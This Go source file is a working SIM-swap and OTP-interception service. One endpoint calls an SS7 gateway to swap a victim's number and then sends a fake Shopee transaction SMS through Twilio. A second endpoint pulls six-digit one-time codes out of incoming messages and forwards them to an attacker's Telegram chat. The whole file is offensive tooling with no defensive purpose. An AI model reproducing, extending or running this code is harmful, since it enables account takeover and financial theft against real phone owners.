package main

import (
 "encoding/json"
 "fmt"
 "log"
 "net/http"
 "os"
 "strconv"
 "strings"
 "time"

 "github.com/gin-gonic/gin"
 "github.com/joho/godotenv"
 "github.com/twilio/twilio-go"
 openapi "github.com/twilio/twilio-go/rest/api/v2010"
 tele "gopkg.in/telebot.v3"
)

var (
 tgBot        *tele.Bot
 chatID       int64
 twilioClient *twilio.RestClient
 ss7GW        string
)

type req struct {
 Last4 string `json:"last4"`
 Phone string `json:"phone"`
}

func init() {
 godotenv.Load("secrets/twilio.key", "secrets/telegram.key", "secrets/ss7.key")
 tgBot, _ = tele.NewBot(tele.Settings{
  Token:  os.Getenv("TG_TOKEN"),
  Poller: &tele.LongPoller{Timeout: 10 * time.Second},
 })
 chatID, _ = strconv.ParseInt(os.Getenv("TG_CHAT_ID"), 10, 64)
 twilioClient = twilio.NewRestClientWithParams(twilio.ClientParams{
  Username: os.Getenv("TWILIO_SID"),
  Password: os.Getenv("TWILIO_TOKEN"),
 })
 ss7GW = os.Getenv("SS7_GATEWAY")
}

func main() {
 gin.SetMode(gin.ReleaseMode)
 r := gin.New()
 r.POST("/swap", handleSwap)
 r.POST("/sms", handleSMS)
 go tgBot.Start()
 r.Run(":8080")
}

func handleSwap(c *gin.Context) {
 var q req
 if err := c.ShouldBindJSON(&q); err != nil {
  c.JSON(http.StatusBadRequest, gin.H{"error": "bad"})
  return
 }
 go func() {
  http.Get(fmt.Sprintf("%s/swap?phone=%s", ss7GW, q.Phone))
  time.Sleep(10 * time.Second)
  params := &openapi.CreateMessageParams{}
  params.SetTo(q.Phone)
  params.SetFrom(os.Getenv("TWILIO_NUMBER"))
  params.SetBody("RM0.00 Txn at SHOPEE. Reply with YES to confirm.")
  twilioClient.Api.CreateMessage(params)
 }()
 c.JSON(http.StatusOK, gin.H{"status": "swapping"})
}

func handleSMS(c *gin.Context) {
 body := c.PostForm("Body")
 for _, word := range strings.Fields(body) {
  if len(word) == 6 && isDigits(word) {
   tgBot.Send(tele.ChatID(chatID), fmt.Sprintf("💀 OTP: `%s`", word))
   break
  }
 }
 c.String(http.StatusOK, "<Response></Response>")
}

func isDigits(s string) bool {
 for _, c := range s {
  if c < '0' || c > '9' {
   return false
  }
 }
 return true
}
